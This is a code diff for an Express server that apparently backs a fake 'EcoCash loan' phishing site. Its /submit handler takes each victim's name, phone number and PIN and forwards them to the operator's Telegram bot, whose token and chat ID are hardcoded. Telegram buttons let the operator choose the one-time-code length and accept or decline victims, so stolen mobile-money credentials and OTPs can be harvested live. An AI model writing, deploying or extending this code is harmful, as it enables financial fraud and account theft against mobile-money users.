@@ -4,35 +4,48 @@ const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch
 
 const app = express();
 
-const sessions = {}; // ✅ MUST BE AT TOP
+let otpLength = null;
+let decision = null; // accept or decline
 
 app.use(express.json());
+
+// serve static files
 app.use(express.static(path.join(__dirname, "public")));
 
+// ==============================
+// TELEGRAM CONFIG (PUT YOURS)
+// ==============================
 const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
 const CHAT_ID = "7162306402";
 
 // ==============================
 // TELEGRAM FUNCTION
 // ==============================
-async function sendToTelegramWithSession(message, sessionId) {
+
+async function sendToTelegram(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
   await fetch(url, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: {
+      "Content-Type": "application/json",
+    },
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: message,
+
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "OTP 5", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5&id=${sessionId}` },
-            { text: "OTP 6", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6&id=${sessionId}` }
+            { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
+            { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
           ],
           [
-            { text: "✅ ACCEPT", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept&id=${sessionId}` },
-            { text: "❌ DECLINE", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline&id=${sessionId}` }
+            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
+            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
+          ],
+          [
+            { text: "🔄 RESET", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset" }
           ]
         ]
       }
@@ -40,74 +53,96 @@ async function sendToTelegramWithSession(message, sessionId) {
   });
 }
 
-// ==============================
-// SUBMIT
-// ==============================
 app.post("/submit", async (req, res) => {
   try {
     const { name, phone, pin } = req.body;
 
-    const sessionId = Date.now().toString();
-
-    sessions[sessionId] = {
-      otp: null,
-      decision: null
-    };
-
     const message = `
 📥 NEW LOAN APPLICATION
-👤 ${name}
-📞 ${phone}
-🔐 ${pin}
-🆔 ${sessionId}
+
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔐 PIN: ${pin}
+
+👇 Use buttons below
 `;
 
-    await sendToTelegramWithSession(message, sessionId); // ✅ FIXED
+console.log("SENDING MESSAGE:", message);
 
-    res.json({ success: true, sessionId });
+    await sendToTelegram(message);
+
+    res.json({ success: true });
 
   } catch (err) {
-    console.error(err);
+    console.error("ERROR:", err.message);
     res.json({ success: false });
   }
 });
 
 // ==============================
-// TELEGRAM COMMAND
+// TELEGRAM ADMIN CONTROL
 // ==============================
 app.get("/telegram-command", (req, res) => {
-  const { cmd, id } = req.query;
+  const cmd = req.query.cmd;
 
-  if (!sessions[id]) return res.send("Invalid session");
+  if (cmd === "otp5") {
+    otpLength = 5;
+    console.log("✅ OTP set to 5 from Telegram");
+  }
 
-  if (cmd === "otp5") sessions[id].otp = 5;
-  if (cmd === "otp6") sessions[id].otp = 6;
-  if (cmd === "accept") sessions[id].decision = "accept";
-  if (cmd === "decline") sessions[id].decision = "decline";
+  if (cmd === "otp6") {
+    otpLength = 6;
+    console.log("✅ OTP set to 6 from Telegram");
+  }
 
-  console.log("SESSION:", id, sessions[id]);
+  if (cmd === "accept") {
+    decision = "accept";
+    console.log("✅ USER ACCEPTED");
+  }
+
+  if (cmd === "decline") {
+    decision = "decline";
+    console.log("❌ USER DECLINED");
+  }
+
+  if (cmd === "reset") {
+    otpLength = null;
+    decision = null;
+    console.log("🔄 Reset all");
+  }
 
   res.send("OK");
 });
-
 // ==============================
-// STATUS
-// ==============================
-app.get("/otp-status", (req, res) => {
-  const id = req.query.id;
-  res.json({ otp: sessions[id]?.otp || null });
-});
-
-app.get("/decision-status", (req, res) => {
-  const id = req.query.id;
-  res.json({ decision: sessions[id]?.decision || null });
-});
-
+// ROOT ROUTE
 // ==============================
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
+app.post("/set-otp", (req, res) => {
+  const { otp } = req.body;
+
+  if (otp !== 5 && otp !== 6) {
+    return res.json({ success: false, message: "Only 5 or 6 allowed" });
+  }
+
+  otpLength = otp;
+
+  console.log("✅ OTP SET TO:", otpLength);
+
+  res.json({ success: true });
+});
+
+app.get("/otp-status", (req, res) => {
+  res.json({ otp: otpLength });
+});
+
+app.get("/decision-status", (req, res) => {
+  res.json({ decision });
+});
+
+// ==============================
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
   console.log(`Server running on ${PORT}`);
